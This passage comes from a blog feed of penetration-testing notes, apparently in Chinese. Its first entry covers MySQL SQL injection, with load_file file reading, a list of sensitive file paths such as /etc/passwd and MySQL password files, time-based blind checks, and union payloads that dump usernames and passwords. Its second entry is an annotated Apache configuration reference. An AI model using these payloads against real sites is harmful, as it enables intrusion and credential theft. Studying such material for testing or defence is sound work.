class=\"token operator\">></span> <span class=\"token keyword\">select</span> load_file<span class=\"token punctuation\">(</span><span class=\"token string\">'d:/test.txt'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    -<span class=\"token operator\">></span> <span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>+--------------------------+</pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token operator\">|</span> load_file<span class=\"token punctuation\">(</span><span class=\"token string\">'d:/test.txt'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>+--------------------------+</pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token operator\">|</span> a</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>aaaa                <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>+--------------------------+</pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token number\">1</span> row <span class=\"token keyword\">in</span> <span class=\"token builtin class-name\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>有一个需要关注的点就是：outfile 后面不能接 0x 开头或者 char 转换以后的路径，只能是单引号路径。这个问题在 php 注入中更加麻烦，因为会自动将单引号转义成 ', 那么基本就 GG 了，但是 load_file，后面的路径可以是单引号、0x、char 转换的字符，但是路径中的斜杠是 / 而不是 \\</p>\n<h3 id=\"mysql新特性secure_file_priv对读写文件的影响\"><a class=\"anchor\" href=\"#mysql新特性secure_file_priv对读写文件的影响\">#</a> MYSQL 新特性 secure_file_priv 对读写文件的影响</h3>\n<p>secure-file-priv 特性<br />\n secure-file-priv 参数是用来限制 LOAD DATA, SELECT ... OUTFILE, and LOAD_FILE () 传到哪个指定目录的。</p>\n<font color=\"red\">\n<ul>\n<li>\n<p>secure_file_priv 的值为 null ，表示限制 mysqld 不允许导入 | 导出</p>\n</li>\n<li>\n<p>当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入 | 导出只能发生在 /tmp/ 目录下</p>\n</li>\n<li>\n<p>当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入 | 导出做限制</p>\n</li>\n</ul>\n</font>\n<p>如何查看 secure-file-priv 参数的值：</p>\n<p><code>show global variables like '%secure%';</code></p>\n<pre><code>+--------------------------+------+\n| Variable_name            | Value|\n+--------------------------+------+\n| require_secure_transport | OFF  |\n| secure_auth              | ON   |\n| secure_file_priv         | NULL |\n+--------------------------+------+\n</code></pre>\n<p>修改 secure_file_priv 的值:<br />\nwindows 下：修改 my.ini 在 [mysqld] 内加入 secure_file_priv =<br />\nlinux 下：修改 my.cnf 在 [mysqld] 内加入 secure_file_priv =<br />\n 然后重启 mysql，再查询 secure_file_priv</p>\n<h3 id=\"load_file-常用路径\"><a class=\"anchor\" href=\"#load_file-常用路径\">#</a> load_file () 常用路径：</h3>\n<p>1、 replace(load_file(0×2F6574632F706173737764),0×3c,0×20)<br />\n2、replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))</p>\n<p>上面两个是查看一个 PHP 文件里完全显示代码。有些时候不替换一些字符，如 “&lt;” 替换成” 空格” 返回的是网页。而无法查看到代码.</p>\n<p>3、 load_file (char (47)) 可以列出 FreeBSD,Sunos 系统根目录<br />\n 4、/etc tpd/conf tpd.conf 或 /usr/local/apche/conf tpd.conf 查看 linux APACHE 虚拟主机配置文件<br />\n 5、c:\\Program Files\\Apache Group\\Apache\\conf \\httpd.conf 或 C:\\apache\\conf \\httpd.conf 查看 WINDOWS 系统 apache 文件<br />\n 6、c:/Resin-3.0.14/conf/resin.conf 查看 jsp 开发的网站 resin 文件配置信息.<br />\n7、c:/Resin/conf/resin.conf/usr/local/resin/conf/resin.conf 查看 linux 系统配置的 JSP 虚拟主机<br />\n 8、d:\\APACHE\\Apache2\\conf\\httpd.conf<br />\n9、C:\\Program Files\\mysql\\my.ini<br />\n10、…/themes/darkblue_orange/layout.inc.php phpmyadmin 爆路径<br />\n 11、 c:\\windows\\system32\\inetsrv\\MetaBase.xml 查看 IIS 的虚拟主机配置文件<br />\n 12、 /usr/local/resin-3.0.22/conf/resin.conf 针对 3.0.22 的 RESIN 配置文件查看<br />\n 13、 /usr/local/resin-pro-3.0.22/conf/resin.conf 同上<br />\n 14 、/usr/local/app/apache2/conf/extra tpd-vhosts.conf APASHE 虚拟主机查看<br />\n 15、 /etc/sysconfig/iptables 本看防火墙策略<br />\n 16 、 usr/local/app/php5 b/php.ini PHP 的相当设置<br />\n 17 、/etc/my.cnf MYSQL 的配置文件<br />\n 18、 /etc/redhat-release 红帽子的系统版本<br />\n 19 、C:\\mysql\\data\\mysql\\user.MYD 存在 MYSQL 系统中的用户密码<br />\n 20、/etc/sysconfig/network-scripts/ifcfg-eth0 查看 IP.<br />\n21、/usr/local/app/php5 b/php.ini//PHP 相关设置<br />\n 22、/usr/local/app/apache2/conf/extra tpd-vhosts.conf// 虚拟网站设置<br />\n 23、C:\\Program Files\\<span class=\"exturl\" data-url=\"aHR0cDovL1JoaW5vU29mdC5jb20=\">RhinoSoft.com</span>\\Serv-U\\ServUDaemon.ini<br />\n24、c:\\windows\\my.ini<br />\n25、c:\\boot.ini</p>\n<h2 id=\"网站常用配置文件\"><a class=\"anchor\" href=\"#网站常用配置文件\">#</a> 网站常用配置文件</h2>\n<p>config.inc.php、config.php。</p>\n<p>load_file（）时要用 replace（load_file (HEX)，char (60),char (32)）<br />\n注：<br />\nChar (60) 表示 &lt;<br />\nChar（32）表示 空格</p>\n<h2 id=\"手工注射时出现的问题\"><a class=\"anchor\" href=\"#手工注射时出现的问题\">#</a> 手工注射时出现的问题：</h2>\n<p>当注射后页面显示：<br />\nIllegal mix of collations (latin1_swedish_ci,IMPLICIT) and (utf8_general_ci,IMPLICIT) for operation ‘UNION’<br />\n如：/instrument.php?ID=13 and 1=2 union select 1,load_file (0x433A5C626F6F742E696E69),3,4,user ()<br />\n 这是由于前后编码不一致造成的，<br />\n解决方法：在参数前加上 unhex (hex (参数)) 就可以了。上面的 URL 就可以改为：<br />\n/instrument.php?ID=13 and 1=2 union select 1,unhex(hex(load_file(0x433A5C626F6F742E696E69))),3,4,unhex(hex(user()))</p>\n<h1 id=\"常见函数\"><a class=\"anchor\" href=\"#常见函数\">#</a> 常见函数</h1>\n<font color=\"DeepSkyBlue\">\n<h2 id=\"length\"><a class=\"anchor\" href=\"#length\">#</a> length()</h2>\n<p>MySQL LENGTH (str) 函数的返回值为字符串的字节长度，使用 uft8（UNICODE 的一种变长字符编码，又称万国码）编码字符集时，一个汉字是 3 个字节，一个数字或字母是一个字节。</p>\n<p>【实例】使用 LENGTH 函数计算字符串长度，输入的 SQL 语句和执行结果如下所示。</p>\n<pre><code>mysql&gt; SELECT LENGTH('name'),LENGTH('数据库');\n+----------------+---------------------+\n|LENGTH('name')  | LENGTH('数据库')    |\n+----------------+---------------------+\n|              4 |                   9 |\n+----------------+---------------------+\n1 row in set (0.04 sec)\n</code></pre>\n<p>由运行结果可以看到，一个汉字是 3 个字节，“数据库” 字符串占 9 个字节。英文字符的个数和所占的字节相同，一个字符占 1 个字节。</p>\n<h2 id=\"substr\"><a class=\"anchor\" href=\"#substr\">#</a> substr()</h2>\n<p>mysql substr () 函数<br />\n截取字符串</p>\n<p>用法：substr (string string,num start,num length);</p>\n<p>select  substr (参数 1，参数 2，参数 3)  from  表名<br />\n string 为字符串；start 为起始位置；length 为长度。</p>\n<p>注意：mysql 中的 start 是从 1 开始的。</p>\n<p>SUBSTR () 函数是 SUBSTRING () 函数的同义词，所以可以互换使用它们</p>\n<h2 id=\"sleep\"><a class=\"anchor\" href=\"#sleep\">#</a> sleep()</h2>\n<h2 id=\"benchmark\"><a class=\"anchor\" href=\"#benchmark\">#</a> benchmark()</h2>\n<pre><code>\nBENCHMARK(count,expr)   \nBENCHMARK()函数重复countTimes次执行表达式expr，它可以用于计时MySQL处理表达式有多快。结果值总是0。意欲用于mysql客户，它报告查询的执行时间。   \nmysql&gt; select BENCHMARK(1000000,encode(&quot;hello&quot;,&quot;goodbye&quot;));   \n+----------------------------------------------+   \n| BENCHMARK(1000000,encode(&quot;hello&quot;,&quot;goodbye&quot;)) |   \n+----------------------------------------------+   \n| 0                                            |   \n+----------------------------------------------+   \n1 row in set (4.74 sec)  \n\n</code></pre>\n<h2 id=\"ifexpr1expr2expr3\"><a class=\"anchor\" href=\"#ifexpr1expr2expr3\">#</a> if(expr1,expr2,expr3)</h2>\n<p>if(length(database())&gt;5,sleep(5),1)</p>\n<h2 id=\"datadir\"><a class=\"anchor\" href=\"#datadir\">#</a> @@datadir</h2>\n<p>数据库文件所在位置</p>\n<h2 id=\"version_compile_os\"><a class=\"anchor\" href=\"#version_compile_os\">#</a> @@version_compile_os</h2>\n<p>查看当前操作系统</p>\n<h2 id=\"concat\"><a class=\"anchor\" href=\"#concat\">#</a> concat()</h2>\n<p>语法及使用特点：<br />\nCONCAT(str1,str2,…)<br />\n 返回结果为连接参数产生的字符串。如有任何一个参数为 NULL ，则返回值为 NULL。可以有一个或多个参数。</p>\n<h2 id=\"concat_ws\"><a class=\"anchor\" href=\"#concat_ws\">#</a> concat_ws()</h2>\n<p>使用函数 CONCAT_WS（）。使用语法为：CONCAT_WS (separator,str1,str2,…)<br />\n CONCAT_WS () 代表 CONCAT With Separator ，是 CONCAT () 的特殊形式。第一个参数是其它参数的分隔符。分<br />\n隔符的位置放在要连接的两个字符串之间。分隔符可以是一个字符串，也可以是其它参数。如果分隔符为 NULL，<br />\n则结果为 NULL。函数会忽略任何分隔符参数后的 NULL 值。但是 CONCAT_WS () 不会忽略任何空字符串。 (然而会<br />\n忽略所有的 NULL）。<br />\n如 SELECT CONCAT_WS ('_',id,name) AS con_ws FROM info LIMIT 1; 返回结果为</p>\n<pre><code>+----------+\n| con_ws   |\n+----------+\n| 1_BioCyc |\n+----------+\n</code></pre>\n<h2 id=\"group_concat\"><a class=\"anchor\" href=\"#group_concat\">#</a> group_concat()</h2>\n<p>区分 concat_ws () 与 group_concat () 函数<br />\n concat_ws (char (32,58,32),user (),database (),version ())<br />\n 在 concat_ws 函数中，第一个参数是用于作为分隔符将后面各个参数的内容分隔开来再进行相应的连接产生新的字符串。</p>\n<p>group_connect () 函数<br />\n完整的语法如下：<br />\ngroup_concat ([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator ‘分隔符’])<br />\n 功能：将 group by 产生的同一个分组中的值连接起来，返回一个字符串结果<br />\n说明：通过使用 distinct 可以排除重复值；如果希望对结果中的值进行排序，可以使用 order by 子句；separator 是一个字符串值，缺省为一个逗号。</p>\n<p>图一，区别<br />\n<img data-src=\"image001.png\" alt=\"\" /></p>\n<p>报错注入<br />\n 0x7e  ASCII    ~</p>\n<p>updatexml () 是更新 xml 文档的函数</p>\n<p>语法 updatexml (目标 xml 文档，xml 路径，更新的内容)<br />\n<img data-src=\"image002.png\" alt=\"\" /></p>\n<h2 id=\"php\"><a class=\"anchor\" href=\"#php\">#</a> php</h2>\n<h3 id=\"preg_math\"><a class=\"anchor\" href=\"#preg_math\">#</a> preg_math()</h3>\n<h3 id=\"floor\"><a class=\"anchor\" href=\"#floor\">#</a> floor()</h3>\n<p>语法<br />\n floor (x)<br />\n 返回不大于 x 的下一个整数，将 x 的小数部分舍去取整。floor () 返回的类型仍然是 float，因为 float 值的范围通常比 integer 要大。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token function\">floor</span><span class=\"token punctuation\">(</span><span class=\"token number\">0.60</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token function\">floor</span><span class=\"token punctuation\">(</span><span class=\"token number\">0.40</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token function\">floor</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token function\">floor</span><span class=\"token punctuation\">(</span><span class=\"token number\">5.1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token function\">floor</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">5.1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token function\">floor</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">5.9</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>//输出：</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>0</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>0</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>5</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>5</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>-6</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>-6</pre></td></tr></table></figure><p>html 实体编码</p>\n</font>\n<h1 id=\"sql-injection-payload\"><a class=\"anchor\" href=\"#sql-injection-payload\">#</a> SQL injection payload</h1>\n<p>用户名 密码<br />\n数字型</p>\n<p><code>?id=-1 union select 1,(select group_concat(concat_ws(&quot;--&gt;&quot;,username,password) separator '&lt;br&gt;') from users),(@@datadir)</code></p>\n<p>字段名</p>\n<p><code>?id=-1 union select 1,2,(select group_concat(column_name separator '&lt;br&gt;') from information_schema.columns where table_name='users')</code></p>\n<p>表名<br />\n <code>?id=-1 union select 1,(select group_concat(table_name separator '&lt;br&gt;') from information_schema.tables where table_schema=database()),3</code></p>\n<p>单引号括号<br />\n <code>?id=-1') union select 1,(select group_concat(concat_ws(&quot;--&gt;&quot;,username,password) separator '&lt;br&gt;') from users),3 --+</code></p>\n",
            "tags": [
                "sql注入"
            ]
        },
        {
            "id": "https://or0kit.github.io/PenetrationTest/Web-Security/Apache-Config/",
            "url": "https://or0kit.github.io/PenetrationTest/Web-Security/Apache-Config/",
            "title": "Apache_Config",
            "date_published": "2020-11-30T00:42:31.000Z",
            "content_html": "<h1 id=\"一-apache主要配置文件注释\"><a class=\"anchor\" href=\"#一-apache主要配置文件注释\">#</a> 一、Apache 主要配置文件注释</h1>\n<p>Apache 的主配置文件：httpd.conf</p>\n<hr />\n<p>Apache 服务器的配置信息全部存储在主配置文件 httpd.conf 中，这个文件中的内容非常多，其中大部分是以 #开头的注释行。</p>\n<hr />\n<p>ServerTokens OS<br />\n 在出现错误页的时候是否显示服务器操作系统的名称，ServerTokens Prod 为不显示</p>\n<hr />\n<p>ServerRoot &quot;/etc/httpd&quot;<br />\n 用于指定 Apache 的运行目录，服务启动之后自动将目录改变为当前目录，在后面使用到的所有相对路径都是相对这个目录</p>\n<hr />\n<p>User daemon                          # apache 的用户，默认为 daemon<br />\nGroup daemon                         # apache 的用户，默认为 daemon</p>\n<hr />\n<p>PidFile run/httpd.pid<br />\n 记录 httpd 守护进程的 pid 号码，这是系统识别一个进程的方法，系统中 httpd 进程可以有多个，但这个 PID 对应的进程是其他的父进程</p>\n<hr />\n<p>Listen 80<br />\n 监听的端口</p>\n<hr />\n<p>Include conf.modules.d/<em>.conf<br />\n 包含辅助配置文件目录下的所有以.conf 结尾的；；；文件 (/etc/httpd/conf.modules.d/</em>.conf)</p>\n<hr />\n<p>User apache       // 运行 web 服务的用户<br />\n Group apache</p>\n<p>ServerAdmin root@localhost<br />\n 管理员邮件地址</p>\n<hr />\n<p>#ServerName <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5leGFtcGxlLmNvbTo4MA==\">www.example.com:80</span></p>\n<p>ServerName <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy51cGxvb2tpbmcuY29tOjgw\">www.uplooking.com:80</span></p>\n<p>服务器的名字</p>\n<hr />\n<p>&lt;Directory /&gt;   --- 容器，对整个目录中的东西进行设置，权限等等<br />\n AllowOverride none<br />\nRequire all denied<br />\n&lt;/Directory&gt;</p>\n<hr />\n<p>DocumentRoot &quot;/var/www/html&quot;    //web 服务文档根路径</p>\n<p>&lt;Directory &quot;/var/www&quot;&gt;<br />\nAllowOverride None<br />\n# Allow open access:<br />\nRequire all granted<br />\n&lt;/Directory&gt;</p>\n<hr />\n<p>&lt;Directory &quot;/var/www/html&quot;&gt;<br />\nOptions Indexes FollowSymLinks     //Indexes：索引目录，（默认没有主页时），允许索引目录   FollowSymLinks：支持符号链接  软连接<br />\n AllowOverride None     // 和访问权限有关  可以进行认证        None -- 不使用认证  all-- 应用所有的认证指令  AuthConfig  -- 允许使用与认证授权相关的指令<br />\n Require all granted    // 访问控制  所有人放行<br />\n &lt;/Directory&gt;</p>\n<hr />\n<p>&lt;IfModule dir_module&gt;<br />\nDirectoryIndex index.html    // 网站索引页的名称<br />\n &lt;/IfModule&gt;</p>\n<hr />\n<p>&lt;Files &quot;.ht*&quot;&gt;   <a href=\"//xn--onqt58b9od.xn--ht-0v2cr7rysinljbd734h560cpjpfa017hsnnga166c4nw\">// 以所有.ht 开头进行模式匹配不能进行访问</a><br />\n Require all denied<br />\n&lt;/Files&gt;</p>\n<hr />\n<p>ErrorLog &quot;logs/error_log&quot;    // 错误日志的设定</p>\n<hr />\n<p>LogLevel warn  // 日志级别</p>\n<hr />\n<p>&lt;IfModule log_config_module&gt;<br />\nLogFormat &quot;% h % l % u % t&quot;% r&quot;%&gt;s % b&quot;%{Referer} i&quot;&quot;%{User-Agent} i&quot;&quot; combined   // 日志格式规定<br />\n LogFormat &quot;% h % l % u % t&quot;% r&quot;%&gt;s % b&quot; common     // 日志格式规定<br />\n &lt;IfModule logio_module&gt;<br />\nLogFormat &quot;% h % l % u % t&quot;% r&quot;%&gt;s % b&quot;%{Referer} i&quot;&quot;%{User-Agent} i&quot; % I % O&quot; combinedio   // 日志格式规定<br />\n &lt;/IfModule&gt;<br />\nCustomLog &quot;logs/access_log&quot; combined  // 访问日志<br />\n &lt;/IfModule&gt;</p>\n<hr />\n<p>&lt;IfModule alias_module&gt;<br />\n# Alias /webpath /full/filesystem/path<br />\n 给路径设置别名<br />\n意味着访问 <code>http://Server_ip/webpath</code>  时，其页面文件来自于 /full/filesystem/path 中<br />\n ScriptAlias /cgi-bin/ &quot;/var/www/cgi-bin/&quot;<br />\n 脚本路径的别名</p>\n<p>&lt;/IfModule&gt;</p>\n<hr />\n<p>&lt;Directory &quot;/var/www/cgi-bin&quot;&gt;<br />\nAllowOverride None<br />\nOptions None<br />\nRequire all granted<br />\n&lt;/Directory&gt;</p>\n<hr />\n<p>&lt;IfModule mime_module&gt;<br />\nTypesConfig /etc/mime.types    // 支持哪些非二进制文件<br />\n AddType application/x-compress .Z<br />\nAddType application/x-gzip .gz .tgz<br />\nAddType text/html .shtml<br />\nAddOutputFilter INCLUDES .shtml<br />\n&lt;/IfModule&gt;</p>\n<hr />\n<p>AddDefaultCharset UTF-8   // 默认字符集</p>\n<hr />\n<p>#EnableMMAP off    // 线程模式<br />\n EnableSendfile on   // 开启进程模式 (默认)</p>\n<hr />\n<p>IncludeOptional conf.d/<em>.conf    <a href=\"//xn--ghqqurb19uen20dx50b1kfwpio3dq99cjbbf29dt43cquf.xn--conf-t85fm71eo1ob75a5vp\">// 包含辅助配置文件目录下的所有以.conf 结尾的文件</a> (/etc/httpd/conf.d/</em>.conf)</p>\n<hr />\n<h1 id=\"二-apache扩展的配置文件\"><a class=\"anchor\" href=\"#二-apache扩展的配置文件\">#</a> 二、Apache 扩展的配置文件</h1>\n<p>$APACHE_HOME/conf/extra          # apache 扩展的配置文件<br />\n [root@extra]# ll<br />\ntotal 56<br />\n-rw-r--r-- 1 root root  2859 Jan 10 01:49 httpd-autoindex.conf<br />\n-rw-r--r-- 1 root root  1753 Jan 10 01:49 httpd-dav.conf<br />\n-rw-r--r-- 1 root root  2344 Jan 10 01:49 httpd-default.conf<br />\n-rw-r--r-- 1 root root  1103 Jan 10 01:49 httpd-info.conf<br />\n-rw-r--r-- 1 root root  5078 Jan 10 01:49 httpd-languages.conf<br />\n-rw-r--r-- 1 root root   932 Jan 10 01:49 httpd-manual.conf<br />\n-rw-r--r-- 1 root root  3789 Jan 10 01:49 httpd-mpm.conf<br />\n-rw-r--r-- 1 root root  2207 Jan 10 01:49 httpd-multilang-errordoc.conf<br />\n-rw-r--r-- 1 root root 11185 Jan 10 01:49 httpd-ssl.conf<br />\n-rw-r--r-- 1 root root   817 Jan 10 01:49 httpd-userdir.conf<br />\n-rw-r--r-- 1 root root  1507 Jan 10 01:49 httpd-vhosts.conf # 虚拟主机配置文件</p>\n<hr />\n<h1 id=\"三-httpd-vhostsconf虚拟主机配置文件注释\"><a class=\"anchor\" href=\"#三-httpd-vhostsconf虚拟主机配置文件注释\">#</a> 三、httpd-vhosts.conf 虚拟主机配置文件注释</h1>\n<p>[root@extra]# egrep -v &quot;<sup>.*#|</sup>$&quot; httpd-vhosts.conf |nl<br />\n1  NameVirtualHost *:80                                # 基于名称的虚拟主机配置（ *:80 表示监听本机所有 ip）<br />\n2  &lt;VirtualHost *:80&gt;                                  # 定义一个虚拟主机<br />\n 3      ServerAdmin <span class=\"exturl\" data-url=\"bWFpbHRvOndlYm1hc3RlckBkdW1teS1ob3N0LmV4YW1wbGUuY29t\">webmaster@dummy-host.example.com</span>    # 配置管理员邮箱<br />\n 4      DocumentRoot &quot;/application/apache2.2.22/docs/dummy-host.example.com&quot;  # 程序的站点目录<br />\n 5      ServerName <span class=\"exturl\" data-url=\"aHR0cDovL2R1bW15LWhvc3QuZXhhbXBsZS5jb20=\">dummy-host.example.com</span>               # 域名服务，需要 apache mode_alias 模块支持<br />\n 6      ServerAlias <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5kdW1teS1ob3N0LmV4YW1wbGUuY29t\">www.dummy-host.example.com</span>          # 虚拟主机别名<br />\n 7      ErrorLog &quot;logs/dummy-host.example.com-error_log&quot;# 错误的日志路径<br />\n 8      CustomLog &quot;logs/dummy-host.example.com-access_log&quot; common  #访问日志配置（生产环境我们用 combined 格式代替 common 格式）<br />\n9  &lt;/VirtualHost&gt;<br />\n10  &lt;VirtualHost *:80&gt;<br />\n11      ServerAdmin <span class=\"exturl\" data-url=\"bWFpbHRvOndlYm1hc3RlckBkdW1teS1ob3N0Mi5leGFtcGxlLmNvbQ==\">webmaster@dummy-host2.example.com</span><br />\n12      DocumentRoot &quot;/application/apache2.2.22/docs/dummy-host2.example.com&quot;<br />\n13      ServerName <span class=\"exturl\" data-url=\"aHR0cDovL2R1bW15LWhvc3QyLmV4YW1wbGUuY29t\">dummy-host2.example.com</span><br />\n14      ErrorLog &quot;logs/dummy-host2.example.com-error_log&quot;<br />\n15      CustomLog &quot;logs/dummy-host2.example.com-access_log&quot; common<br />\n16  &lt;/VirtualHost&gt;</p>\n",
            "tags": [
                "Apeache"
            ]
        }
    ]
}